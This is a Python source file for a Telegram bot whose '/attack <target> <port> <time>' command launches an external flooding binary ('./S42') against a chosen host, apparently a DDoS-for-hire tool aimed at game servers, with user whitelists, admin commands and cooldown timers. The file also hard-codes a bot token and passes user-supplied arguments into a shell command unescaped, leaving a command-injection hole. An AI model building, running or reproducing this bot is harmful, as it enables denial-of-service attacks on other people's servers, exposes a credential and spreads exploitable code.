import telebot
import datetime
import subprocess
import threading
import time
import requests

TOKEN = "7706816535:AAFjqNpIf-LjKRpuA7JfLTq0FGOrNq4J4Xc"
bot = telebot.TeleBot(TOKEN, threaded=True)

admin_id = ["6769245930"]
allowed_user_ids = ["6769245930", "6769245930"]  # Allowed users

bgmi_cooldown = {}  # Stores cooldown timers
COOLDOWN_TIME = 240  # Cooldown in seconds
cooldown_messages = {}  # Stores pinned cooldown messages


def safe_send_message(chat_id, text, pin=False):
    """ Sends a message safely with retry logic. """
    for attempt in range(3):  
        try:
            msg = bot.send_message(chat_id, text, parse_mode="Markdown")
            if pin:
                bot.pin_chat_message(chat_id, msg.message_id)
            return msg
        except requests.exceptions.RequestException as e:
            if e.response and e.response.status_code == 429:
                # Telegram rate limit error
                retry_after = e.response.json().get('parameters', {}).get('retry_after', 1)
                print(f"Rate limit hit. Retrying in {retry_after} seconds...")
                time.sleep(retry_after)  # Wait for the retry period
                continue
            else:
                print(f"Error sending message: {e}")
                time.sleep(3)
                continue
    return None


def check_cooldown(user_id):
    """ Checks if the user is in cooldown. """
    if user_id in bgmi_cooldown:
        elapsed = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
        if elapsed < COOLDOWN_TIME:
            return COOLDOWN_TIME - elapsed  # Returns remaining cooldown time
    return 0  # No cooldown


def send_attack_end_message(chat_id, target, port, duration):
    """ Sends attack completion message after the attack duration. """
    time.sleep(duration)  # Wait for the attack duration to finish
    safe_send_message(chat_id, f"✅ **Attack Completed!**\n\n"
                               f"🎯 **Target:** `{target}`\n"
                               f"🔢 **Port:** `{port}`\n"
                               f"⏳ **Duration:** `{duration} sec`\n\n"
                               f"🔹 **You can now start another attack.**")


def send_cooldown_message(chat_id, user_id):
    """ Sends and updates a pinned cooldown message with a live countdown. """
    cooldown_end_time = datetime.datetime.now() + datetime.timedelta(seconds=COOLDOWN_TIME)
    cooldown_msg = safe_send_message(chat_id, f"⏳ **Cooldown Started** ⏳\n\n"
                                              f"🔻 Remaining: {COOLDOWN_TIME} seconds\n"
                                              f"⚡ Please wait before using another attack.", pin=True)

    if cooldown_msg:
        cooldown_messages[user_id] = cooldown_msg.message_id
        while True:
            remaining_time = (cooldown_end_time - datetime.datetime.now()).seconds
            if remaining_time <= 0:
                try:
                    bot.edit_message_text("✅ **Cooldown Ended!** You can attack again.",
                                          chat_id, cooldown_msg.message_id)
                    bot.unpin_chat_message(chat_id, cooldown_msg.message_id)
                    del cooldown_messages[user_id]
                except:
                    pass  # Ignore errors if message is deleted
                break
            try:
                bot.edit_message_text(f"⏳ **Cooldown Started** ⏳\n\n"
                                      f"🔻 Remaining: {COOLDOWN_TIME} seconds\n"
                                      f"⚡ Please wait before using another attack.",
                                      chat_id, cooldown_msg.message_id)
            except:
                break  # If message is deleted, stop updating
            time.sleep(1)


@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)

    # Check if user is allowed
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    # Check cooldown for non-admins
    if user_id not in admin_id:
        remaining_cooldown = check_cooldown(user_id)
        if remaining_cooldown > 0:
            bot.reply_to(message, f"⏳ **Cooldown Active** ⏳\n\n"
                                  f"🕒 **Remaining Time:** `{remaining_cooldown} sec`\n"
                                  f"⚡ Please wait before using another attack.")
            return

    # Parse attack command
    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = int(command[2])
        duration = int(command[3])

        if duration > 240:
            bot.reply_to(message, "🚫 The maximum supported time is **240 seconds**.")
            return

        # Send attack start message
        safe_send_message(message.chat.id, f"🔥 **Attack Started!** 🔥\n\n"
                                           f"🎯 **Target:** `{target}`\n"
                                           f"🔢 **Port:** `{port}`\n"
                                           f"⏳ **Duration:** `{duration} sec`\n\n"
                                           f"🚀 **Attack in progress...**")

        # Start attack in a separate thread
        full_command = f"./S42 {target} {port} {duration} 1000"
        threading.Thread(target=subprocess.run, args=(full_command,), kwargs={"shell": True}).start()

        # Schedule attack end message after the duration
        threading.Thread(target=send_attack_end_message, args=(message.chat.id, target, port, duration)).start()

        # Start cooldown **only for non-admin users**
        if user_id not in admin_id:
            bgmi_cooldown[user_id] = datetime.datetime.now()
            threading.Thread(target=send_cooldown_message, args=(message.chat.id, user_id)).start()

    else:
        bot.reply_to(message, "❌ Invalid command format.\nUse: `/attack <target> <port> <time>`")


@bot.message_handler(commands=['add'])
def add_user(message):
    """ Admin command to add a user to the allowed list. """
    if str(message.chat.id) in admin_id:
        command = message.text.split()
        if len(command) == 2:
            new_user = command[1]
            if new_user not in allowed_user_ids:
                allowed_user_ids.append(new_user)
                bot.reply_to(message, f"✅ User `{new_user}` has been added.")
            else:
                bot.reply_to(message, "⚠️ User is already in the allowed list.")
        else:
            bot.reply_to(message, "❌ Use `/add <user_id>` to add a user.")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")


@bot.message_handler(commands=['remove'])
def remove_user(message):
    """ Admin command to remove a user from the allowed list. """
    if str(message.chat.id) in admin_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                bot.reply_to(message, f"✅ User `{user_to_remove}` has been removed.")
            else:
                bot.reply_to(message, "⚠️ User not found in the allowed list.")
        else:
            bot.reply_to(message, "❌ Use `/remove <user_id>` to remove a user.")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")


@bot.message_handler(commands=['reset_cooldown'])
def reset_cooldown(message):
    """ Admin command to reset cooldown for all users. """
    if str(message.chat.id) in admin_id:
        bgmi_cooldown.clear()
        bot.reply_to(message, "✅ All cooldowns have been reset.")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")


@bot.message_handler(commands=['help'])
def help_command(message):
    """ Displays a help message with bot commands. """
    help_text = ("📌 **Bot Commands** 📌\n\n"
                 "🚀 **Attack Commands:**\n"
                 "`/attack <target> <port> <time>` - Start an attack (Max time: 240 sec)\n"
                 "`/add <user_id>` - Add a user (Admin only)\n"
                 "`/remove <user_id>` - Remove a user (Admin only)\n"
                 "`/reset_cooldown` - Reset cooldown (Admin only)\n"
                 "`/help` - Show this help message")

    bot.reply_to(message, help_text, parse_mode="Markdown")


# Auto-restart logic in case bot stops
while True:
    try:
        bot.polling(none_stop=True, timeout=20)
    except Exception as e:
        print(f"Error occurred: {e}")
        time.sleep(1)  # Wait before restarting the bot
